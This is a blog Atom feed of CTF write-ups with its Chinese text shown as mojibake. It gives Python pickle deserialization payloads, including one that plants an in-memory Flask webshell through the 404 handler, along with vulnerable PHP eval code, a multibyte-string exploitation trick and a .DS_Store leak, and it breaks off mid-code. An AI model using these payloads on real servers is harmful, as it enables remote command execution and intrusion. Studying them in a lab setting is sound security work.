<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NaCl&#39;s Blog</title>
  
  <subtitle>hi</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-30T05:28:35.208Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>NaCl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›Web</title>
    <link href="http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/"/>
    <id>http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/</id>
    <published>2024-05-30T05:27:49.000Z</published>
    <updated>2024-05-30T05:28:35.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°"><a href="#ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°" class="headerlink" title="ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°"></a>ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°</h1><p>é¢˜ç›®è¿˜æŒºä¸é”™çš„, ä½†æ˜¯èµ›ä¸­æ²¡åš, è¿™é‡Œçœ‹wpå¤ç°ä¸€ä¸‹</p><p>è†œæ‹œå¤§å¸ˆå‚…wp <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h2 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h2><p>éšä¾¿ä¼ ä¸€ä¸ªopcodeä¼šå‘ç°å¹¶ä¸æ˜¯ååºåˆ—åŒ–æ‰§è¡Œäº†, è€Œæ˜¯ç”¨pickletools.dis, ä¸€çœ¼çœ‹å‡ºæ¥äº†,ä½†æ˜¯ä»¥ä¸ºè¿™é‡Œè¿˜ä»¥ä¸ºå¯ä»¥æ³¨å…¥, æ²¡æƒ³åˆ°è¿™é‡Œå…¶å®æ˜¯flaskå¼€äº†debugæ¨¡å¼ ç›´æ¥æ„é€ æŠ¥é”™å°±å¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-revenge"><a href="#Python-revenge" class="headerlink" title="Python-revenge"></a>Python-revenge</h2><p>è¿™ä¸ªä¹Ÿæ˜¯åœ¨gxngxngxnå¸ˆå‚…å¯¹pythonå†…å­˜é©¬çš„ç ”ç©¶orz</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>ä¹‹åéšä¾¿æ‰“å¼€ä¸€ä¸ª404é¡µé¢å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><h2 id="é€ƒè·‘å¤§å¸ˆ"><a href="#é€ƒè·‘å¤§å¸ˆ" class="headerlink" title="é€ƒè·‘å¤§å¸ˆ"></a>é€ƒè·‘å¤§å¸ˆ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$A</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span> = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span> = <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$A</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;A = <span class="variable">$A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$this</span>-&gt;B . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$this</span>-&gt;C . <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$Class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>]);</span><br><span class="line">    <span class="variable">$Key</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Class</span>);</span><br><span class="line">    <span class="variable">$K</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;SDPCSEC&quot;</span>, <span class="string">&quot;SanDieg0&quot;</span>, <span class="variable">$Key</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$K</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿmb_strposä¸mb_substræ‰§è¡Œå·®å¼‚å¯¼è‡´çš„æ¼æ´</p><p>è¿™é‡Œæˆ‘ä¹Ÿæµ‹è¯•äº†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$data</span>[<span class="variable">$start</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> ;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span> . <span class="string">&#x27; &#x27;</span> .  <span class="variable">$data</span>[<span class="variable">$end</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>] . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$_GET</span>[<span class="number">1</span>] . <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯<code>%9f</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515184216748.png" alt="image-20240515184216748"></p><p>å¯ä»¥çœ‹è§è¿™é‡Œçš„mb_strposæ˜¯ç›´æ¥å¿½ç•¥äº†<code>%9f</code>è¿™ä¸ªä¸å¯è§å­—ç¬¦, è€Œmb_substrå¹¶æ²¡æœ‰å¿½ç•¥, è€Œæ˜¯æ­£å¸¸å¤„ç†, è¿™å¯¼è‡´è¿”å›çš„å­—ç¬¦æ•´ä½“å‘å‰ç§»äº†ä¸€ä½</p><p>å†æ¥çœ‹<code>%f0</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515193637458.png" alt="image-20240515193637458"></p><p>è¿™é‡Œmb_strposæ˜¯æ­£å¸¸è¯†åˆ«çš„, mb_substræŠŠ<code>%f0</code> è¿ç€åé¢çš„ä¸‰ä¸ªå­—ç¬¦è¯†åˆ«æˆäº†ä¸€ä¸ªå­—ç¬¦</p><p>åœ¨mb_substrçœ‹æ¥, ç¬¬0ä¸ªå­—ç¬¦æ˜¯<code>%f0[we</code> , ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>l</code> , ç„¶åè¿ç€è¾“å‡ºäº†åé¢21ä¸ªå­—ç¬¦</p><p>å› æ­¤,<code>%9f</code>ç”¨æ¥å¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œ<code>%f0</code>ç”¨æ¥å‡å°‘ä¸‰ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå¯ä»¥å®ç°ä»»æ„å­—ç¬¦çš„æ„é€ </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515201303695.png" alt="image-20240515201303695"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515202049157.png" alt="image-20240515202049157"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°&quot;&gt;&lt;/a&gt;ç¬¬äºŒå±Šé»„æ²³æµåŸŸå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›å¤ç°&lt;/h1&gt;&lt;p&gt;é¢˜ç›®è¿˜æŒºä¸é”™çš„, ä½†æ˜¯èµ›ä¸­æ²¡</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Dragon Knight CTF 2024</title>
    <link href="http://example.com/2024/05/30/Dragon-Knight-CTF-2024/"/>
    <id>http://example.com/2024/05/30/Dragon-Knight-CTF-2024/</id>
    <published>2024-05-30T03:42:58.000Z</published>
    <updated>2024-05-30T03:44:27.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>ç›´æ¥æ‰«ç </p><h2 id="ç¥ç§˜æ–‡å­—"><a href="#ç¥ç§˜æ–‡å­—" class="headerlink" title="ç¥ç§˜æ–‡å­—"></a>ç¥ç§˜æ–‡å­—</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ“…‚=+![];ğ“‚€=+!ğ“…‚;ğ“„=ğ“‚€+ğ“‚€;ğ“Š=ğ“„+ğ“‚€;ğ“†£=ğ“„*ğ“„;ğ“Š=ğ“Š+ğ“„;ğ“†«=ğ“„*ğ“Š;ğ“…¬=ğ“†£+ğ“Š;[ğ“‡,ğ“¢,ğ“†—,ğ“ƒ ,ğ“ƒ€,ğ“‹Œ,ğ“,ğ“‡²,ğ“£,ğ“º,ğ“,ğ“‡²,ğ“†¦,ğ“,ğ“£,ğ“‡²,ğ“„¬,ğ“‡²,ğ“£,ğ“,ğ“‹Œ,ğ“£,ğ“‡²,ğ“,ğ“‹Œ,ğ“‡²]=(ğ“†¡=&#x27;\\&quot;&#x27;)+!!ğ“†¡+!ğ“†¡+ğ“†¡.ğ“†¡+&#123;&#125;;ğ“†‰=ğ“‡²+ğ“£+ğ“†¦+ğ“º+ğ“†—+ğ“ƒ +ğ“ƒ€+ğ“‡²+ğ“†—+ğ“£+ğ“ƒ ,ğ“†‰=ğ“†‰[ğ“†‰][ğ“†‰],ğ“„¦=ğ“+ğ“£+ğ“„¬+ğ“†¦,ğ“„€=ğ“ƒ +ğ“‹Œ+ğ“†—+ğ“ƒ€+ğ“ƒ +ğ“†¦+&quot; &quot;;ğ“†‰(ğ“†‰(ğ“„€+ğ“¢+ğ“†‰(ğ“„€+[...&quot;ğ“‡ğ“‚€ğ“…‚ğ“…¬ğ“‡ğ“‚€ğ“‚€ğ“…¬ğ“‡ğ“‚€ğ“‚€ğ“…¬ğ“‡ğ“‚€ğ“…‚ğ“†£ğ“‡ğ“†£ğ“‚€ğ“‡ğ“‚€ğ“Šğ“‚€ğ“‡ğ“‚€ğ“‚€ğ“…¬ğ“‡ğ“‚€ğ“„ğ“Šğ“‡ğ“‚€ğ“†«ğ“„ğ“‡ğ“†£ğ“…‚ğ“‡ğ“‚€ğ“†«ğ“…‚ğ“‡ğ“‚€ğ“…‚ğ“‚€ğ“‡ğ“‚€ğ“†«ğ“Šğ“‡ğ“‚€ğ“†«ğ“Šğ“‡ğ“‚€ğ“„ğ“…¬ğ“‡ğ“‚€ğ“Šğ“…¬ğ“‡ğ“‚€ğ“†«ğ“„ğ“‡ğ“‚€ğ“†£ğ“†£ğ“‡ğ“†£ğ“…‚ğ“‡ğ“‚€ğ“Šğ“‚€ğ“‡ğ“‚€ğ“†«ğ“Šğ“‡ğ“…¬ğ“„ğ“‡ğ“‚€ğ“Šğ“Šğ“‡ğ“‚€ğ“…‚ğ“‚€ğ“‡ğ“‚€ğ“†«ğ“„ğ“‡ğ“‚€ğ“†«ğ“†£ğ“‡ğ“†«ğ“‚€ğ“‡ğ“‚€ğ“‚€ğ“†«ğ“‡ğ“‚€ğ“Šğ“…¬ğ“‡ğ“‚€ğ“‚€ğ“Šğ“‡ğ“†«ğ“‚€ğ“‡ğ“‚€ğ“…‚ğ“Šğ“‡ğ“‚€ğ“„ğ“…‚ğ“‡ğ“‚€ğ“†«ğ“…‚ğ“‡ğ“†«ğ“Š&quot;][ğ“„¦]`+`)``+ğ“¢)``)``</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼jsFuck</p><p>æ”¾åˆ°æœ¬åœ°nodeç¯å¢ƒè¿è¡Œ</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526202432238.png" alt="image-20240526202432238" /><p>æ‹¿åˆ°å‹ç¼©åŒ…å¯†ç  mArt1N_K1EPp3</p><p>DRKCTF{D0_Y0u_KnOw_Wh0_Creat3_J5Fu*K?}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©"><a href="#ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©" class="headerlink" title="ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©"></a>ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©</h2><p>è°·æ­Œè¯†å›¾ç›´æ¥å¯ä»¥è¯†åˆ«åˆ°è¿™ä¸ªè§†é¢‘ï¼Œ å’Œå›¾ç‰‡é‡Œçš„æ‘©å¤©è½®ä¸€æ¨¡ä¸€æ ·</p><p><a href="https://www.youtube.com/watch?app=desktop&v=2JY1s5UysPk&ab_channel=ActionKid">https://www.youtube.com/watch?app=desktop&amp;v=2JY1s5UysPk&amp;ab_channel=ActionKid</a></p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143303296.png" alt="image-20240525143303296" /><p>å»è°·æ­Œåœ°å›¾æ‰¾åˆ°ç²¾ç¡®ä½ç½®</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143102076.png" alt="image-20240525143102076" /><p>DRKCTF{ç¾å›½-ä½›ç½—é‡Œè¾¾å·-è¿ˆé˜¿å¯†å¸‚-Skyviews}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•ï¼Œadmin&#x2F;admin</p><p>æ˜¯ä¸€ä¸ªå‰ç«¯çš„ç•™è¨€æ¿ï¼Œ æ²¡ä»€ä¹ˆç”¨</p><p>æ‰«æä¸€ä¸‹ç›®å½•</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526190725821.png" alt="image-20240526190725821" /><p> å¯ä»¥çœ‹è§è¿˜æ˜¯èƒ½æ‰«æå‡ºæ¥å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬.DS_Store</p><p>githubä¸Šéšä¾¿æ‰¾ä¸€ä¸ªåˆ©ç”¨çš„.DS_Storeå·¥å…·ï¼Œ æˆ‘è¿™é‡Œç”¨çš„æ˜¯ds_store_exp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526193540195.png" alt="image-20240526193540195" /><p>ä¸»è¦çœ‹è¿™ä¸ªindex.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// æ£€æŸ¥ cookie ä¸­æ˜¯å¦æœ‰ token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Backï¼Œ&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//å¦‚æœ upload ç›®å½•ä¸‹å­˜åœ¨$username.pngæ–‡ä»¶ï¼Œåˆ™æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// æ˜¾ç¤ºå›¾ç‰‡ï¼Œç¼©å°å›¾ç‰‡</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;è¯·ä¸Šä¼ æ‚¨é«˜è´µçš„å¤´åƒã€‚&#x27;</span>;</span><br><span class="line">            <span class="comment">// å†™ä¸€ä¸ªä¸Šä¼ å¤´åƒçš„åŠŸèƒ½</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;ç•™ä¸ªè¨€å§&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;ç•™è¨€æ¿&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span 